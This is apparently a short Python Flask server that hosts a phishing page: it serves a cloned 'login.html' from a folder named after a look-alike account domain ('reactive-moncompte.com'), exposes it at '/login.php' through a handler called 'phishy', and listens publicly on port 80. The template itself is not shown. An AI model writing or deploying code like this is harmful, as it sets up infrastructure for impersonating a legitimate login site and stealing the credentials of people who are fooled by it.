from flask import Flask, render_template

app = Flask(__name__, static_folder='', template_folder='reactive-moncompte.com')

@app.route('/login.php')
def phishy():
    return render_template('login.html')

if __name__ == '__main__':
    app.run('0.0.0.0', 80)